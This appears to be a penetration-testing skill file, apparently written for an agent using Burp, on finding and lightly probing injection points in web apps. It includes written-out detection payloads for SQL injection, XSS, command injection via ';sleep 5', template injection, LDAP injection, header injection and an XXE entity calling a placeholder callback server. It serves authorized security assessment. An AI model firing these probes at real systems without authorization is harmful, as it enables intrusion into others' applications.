# SKILL: Injection Point Identification

This skill covers identification and initial testing of injection vectors: SQL Injection, XSS, Command Injection, and related vulnerabilities.

## Scope

| Injection Type | Impact | Detection Difficulty |
|----------------|--------|---------------------|
| SQL Injection | Critical | Medium |
| Command Injection | Critical | Medium |
| LDAP Injection | High | Medium |
| XSS (Stored) | High | Easy |
| XSS (Reflected) | Medium | Easy |
| Template Injection | High-Critical | Medium |
| Header Injection | Medium | Easy |
| XML/XXE | High-Critical | Medium |

---

## Note on Testing Approach

This skill focuses on **identification and indicator detection** from passive traffic analysis, with light active testing. Full exploitation requires dedicated tools and is often out of scope for initial assessment.

---

## Phase A: Input Vector Identification

### Step A1: Identify All Input Points

Map every user-controllable input in traffic:

```
INPUT LOCATION          | EXAMPLES
------------------------|------------------------------------------
URL Path                | /search/{query}, /users/{id}
Query Parameters        | ?search=term&sort=name&page=1
Request Body (JSON)     | {"query": "search term", "filter": {...}}
Request Body (Form)     | username=admin&password=pass
Request Body (XML)      | <query><term>search</term></query>
HTTP Headers            | User-Agent, Referer, X-Custom-Header
Cookies                 | session=abc; preferences=xyz
File Uploads            | filename, content, metadata
```

### Step A2: Classify Input Processing

For each input, determine likely backend processing:

```
INPUT PATTERN           | LIKELY PROCESSING        | INJECTION RISK
------------------------|--------------------------|----------------
search, query, q        | Database query           | SQLi
filter, where, order    | Database query           | SQLi
sort, orderby           | ORDER BY clause          | SQLi (limited)
id, user_id, ref        | Database lookup          | SQLi
file, path, template    | File system / template   | LFI, Template
cmd, command, exec      | Command execution        | Command Injection
url, redirect, callback | URL handling             | SSRF, Open Redirect
xml, data (XML body)    | XML parsing              | XXE
html, content, message  | HTML rendering           | XSS
email, name, comment    | Stored & displayed       | Stored XSS
```

---

## Phase B: SQL Injection Indicators

### Step B1: Identify SQLi-Likely Parameters

High-risk parameters:

```
Query/Search:    q, query, search, keyword, term, filter
Sorting:         sort, order, orderby, sortby, dir, asc, desc
Pagination:      page, limit, offset, skip, take
Filtering:       where, filter, status, type, category, id
Lookup:          id, user_id, product_id, order_id (numeric especially)
Date Ranges:     from, to, start_date, end_date, before, after
Multi-value:     ids[], categories[], tags
```

### Step B2: Response-Based SQLi Indicators

Look for these in responses when parameters are present:

```
ERROR INDICATORS (in response body):
- "SQL syntax"
- "mysql_fetch"
- "ORA-" (Oracle)
- "PostgreSQL"
- "SQLite"
- "JDBC"
- "ODBC"
- "syntax error"
- "unclosed quotation mark"
- "quoted string not properly terminated"
- Stack traces mentioning database
- Column/table names leaked

BEHAVIORAL INDICATORS:
- Different response for id=1 vs id=1'
- Empty results with certain characters
- 500 errors on special characters
- Response time changes with SLEEP/WAITFOR
```

### Step B3: Light SQLi Probing

Safe initial tests (shouldn't cause damage):

```
DETECTION PAYLOADS:
'                     → Unclosed quote
''                    → Escaped quote (should work normally)
' OR '1'='1           → Boolean logic
1 AND 1=1             → True condition
1 AND 1=2             → False condition (different response?)
' AND 'a'='a          → String true condition
'; --                 → Comment termination

COMPARE RESPONSES:
Original: /api/users?id=1           → Normal response
Test 1:   /api/users?id=1'          → Error? Different?
Test 2:   /api/users?id=1 AND 1=1   → Same as original?
Test 3:   /api/users?id=1 AND 1=2   → Different/empty?

If Test 2 = Original AND Test 3 ≠ Original → Boolean SQLi indicator
```

### Step B4: Document SQLi Candidates

```
Endpoint: GET /api/products
Parameter: category_id
Type: Numeric lookup
Indicators:
  - Error message on single quote: "SQL syntax error"
  - Boolean difference: 1 AND 1=1 vs 1 AND 1=2 shows different product counts
Risk: High - Likely vulnerable to SQLi
Burp IDs: #101, #102, #103
```

---

## Phase C: XSS Indicators

### Step C1: Identify Reflection Points

Look for input values appearing in responses:

```
REFLECTION HUNTING:
1. Note parameter values in requests
2. Search for those values in responses
3. Note the context of reflection

CONTEXTS:
- HTML body: <div>USER_INPUT</div>
- HTML attribute: <input value="USER_INPUT">
- JavaScript: var x = 'USER_INPUT';
- URL: href="USER_INPUT"
- CSS: style="background: USER_INPUT"
```

### Step C2: Identify Stored Content

Content that gets stored and displayed to others:

```
HIGH RISK (Stored XSS):
- User profiles (name, bio, about)
- Comments, reviews, posts
- Messages, chat content
- File names
- Form submissions viewed by admins
- Error logs viewed by support

MEDIUM RISK (Reflected XSS):
- Search results pages
- Error messages
- Redirect parameters
- 404 pages with URL in message
```

### Step C3: Response Analysis

Look for missing/weak protections:

```
MISSING HEADERS (check response):
- No Content-Security-Policy
- X-XSS-Protection: 0 or missing
- X-Content-Type-Options missing

REFLECTION WITHOUT ENCODING:
- Input: <test>
- Output: <test> (no encoding)
- Vulnerable indicator

PARTIAL ENCODING:
- Input: <script>alert(1)</script>
- Output: &lt;script>alert(1)</script>
- Inconsistent encoding
```

### Step C4: Light XSS Probing

Non-destructive test payloads:

```
REFLECTION TEST:
Input: xss<>'"test
Check: Are <, >, ', " encoded or raw?

CONTEXT DETECTION:
Input: "><test
Check: Does it break out of attribute?

Input: </title><test>
Check: Does it break out of tag?

POLYGLOT (detects multiple contexts):
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//

If ANY of these reflect unencoded → XSS likely
```

### Step C5: Document XSS Candidates

```
Endpoint: GET /search
Parameter: q
Reflection: Value appears in <h1>Search results for: {q}</h1>
Encoding: < and > are NOT encoded
Context: HTML body
Risk: High - Reflected XSS likely
Test: q=<img src=x onerror=alert(1)> 
Burp IDs: #201, #202
```

---

## Phase D: Command Injection Indicators

### Step D1: Identify Command-Likely Inputs

Parameters suggesting command execution:

```
HIGH RISK PARAMETERS:
- cmd, command, exec, run
- ping, host, ip
- filename, file, path
- backup, export, convert
- daemon, service, process
- template (if shell-based)

HIGH RISK ENDPOINTS:
- /api/ping
- /api/export
- /api/convert
- /api/backup
- /api/tools/*
- Admin panels with "run" functions
```

### Step D2: Response Indicators

Signs of command execution in responses:

```
COMMAND OUTPUT PATTERNS:
- TTL= (ping output)
- bytes from (ping output)
- Permission denied
- No such file or directory
- Command not found
- Shell-like output format
- Timing delays matching commands

ERROR PATTERNS:
- sh: command not found
- /bin/bash: syntax error
- unexpected EOF
- cannot execute binary file
```

### Step D3: Light Command Injection Probing

Safe detection payloads:

```
TIME-BASED (safest):
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)

Compare response times:
- Normal: ~200ms
- With sleep: ~5200ms → Command Injection

CANARY DETECTION:
; echo UNIQUESTRING123
| echo UNIQUESTRING123

If UNIQUESTRING123 appears in response → Command Injection
```

### Step D4: Document Command Injection Candidates

```
Endpoint: GET /api/network/ping
Parameter: host
Indicators:
  - Normal response contains "bytes from {host}"
  - Adding ; sleep 5 causes 5 second delay
  - Response format matches system ping output
Risk: Critical - Command injection confirmed
Burp IDs: #301, #302
```

---

## Phase E: Other Injection Types

### Template Injection

```
DETECTION PAYLOADS:
{{7*7}}           → 49 (Jinja2, Twig)
${7*7}            → 49 (FreeMarker, Velocity)
<%= 7*7 %>        → 49 (ERB)
#{7*7}            → 49 (Ruby)
{php}echo 7*7;{/php} → Smarty

If mathematical expression evaluates → SSTI
```

### XML/XXE

```
Look for XML in requests:
Content-Type: application/xml
Content-Type: text/xml

TEST PAYLOAD (safe OOB):
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://YOUR-CALLBACK-SERVER/xxe-test">
]>
<data>&xxe;</data>

If callback received → XXE vulnerable
```

### LDAP Injection

```
INDICATORS:
- Login forms
- User search
- Directory queries

TEST PAYLOADS:
*              → Wildcard
)(cn=*))(|(cn=*   → Filter manipulation
admin)(&)     → Injection
```

### Header Injection

```
INDICATORS:
- Values reflected in response headers
- Email functionality (headers in email)
- Log files with header data

TEST:
Add CRLF: value%0d%0aX-Injected: true
Check if new header appears in response
```

---

## Evidence Collection

For each injection candidate:

```markdown
## Injection Finding Template

**Type**: [SQLi | XSS | Command | Template | XXE]
**Endpoint**: [Full endpoint path]
**Parameter**: [Vulnerable parameter]
**Method**: [GET/POST/etc]

**Detection Evidence**:
- Baseline Request: [Normal request]
- Baseline Response: [Normal response summary]
- Test Request: [With injection payload]
- Test Response: [What changed]

**Indicators**:
- [List specific indicators observed]

**Risk Assessment**:
- Exploitability: [Easy/Medium/Hard]
- Impact: [Critical/High/Medium/Low]
- Confidence: [Confirmed/Likely/Possible]

**Burp IDs**: [Request IDs for evidence]

**Recommended Next Steps**:
- [Full exploitation testing]
- [Tool-based scanning]
- [Manual verification]
```

---

## Output Format

Write findings to `output/findings/injection.md`:

```markdown
# Injection Analysis Findings

## Summary
- Input points analyzed: 47
- SQLi indicators: 3
- XSS indicators: 5
- Command Injection indicators: 1

---

## Finding 1: SQL Injection in Product Search

**Type**: SQL Injection
**Severity**: High
**Endpoint**: GET /api/products/search
**Parameter**: category

### Evidence

**Baseline**:
\`\`\`http
GET /api/products/search?category=electronics HTTP/1.1
→ 200 OK, 24 products returned
\`\`\`

**Test 1 - Quote**:
\`\`\`http
GET /api/products/search?category=electronics' HTTP/1.1
→ 500 Error: "You have an error in your SQL syntax..."
\`\`\`

**Test 2 - Boolean True**:
\`\`\`http
GET /api/products/search?category=electronics' AND '1'='1 HTTP/1.1
→ 200 OK, 24 products (same as baseline)
\`\`\`

**Test 3 - Boolean False**:
\`\`\`http
GET /api/products/search?category=electronics' AND '1'='2 HTTP/1.1
→ 200 OK, 0 products (different!)
\`\`\`

### Analysis
- SQL error message confirms injection point
- Boolean-based blind SQLi confirmed
- Full exploitation would allow data extraction

**Burp IDs**: #401, #402, #403, #404

### Recommended Action
- Immediate: Parameterized queries
- Tool: sqlmap for full assessment
```

---

## Testing Checklist

```
Input Mapping:
[ ] All URL parameters documented
[ ] All request body fields documented
[ ] All headers accepting user input noted
[ ] All cookies analyzed
[ ] File upload parameters identified

SQL Injection:
[ ] Search/query parameters tested
[ ] Filter/sort parameters tested
[ ] ID parameters tested
[ ] Error messages examined
[ ] Boolean blind testing done

XSS:
[ ] All reflection points identified
[ ] Response encoding analyzed
[ ] Context of reflections noted
[ ] Stored content points identified
[ ] Security headers checked

Command Injection:
[ ] System interaction endpoints identified
[ ] Time-based testing performed
[ ] Error messages examined

Other:
[ ] XML endpoints tested for XXE
[ ] Template-rendered content tested
[ ] LDAP endpoints identified
[ ] Header injection points checked

Documentation:
[ ] All candidates documented with evidence
[ ] Risk levels assigned
[ ] Burp IDs recorded
[ ] Output to findings/injection.md
```
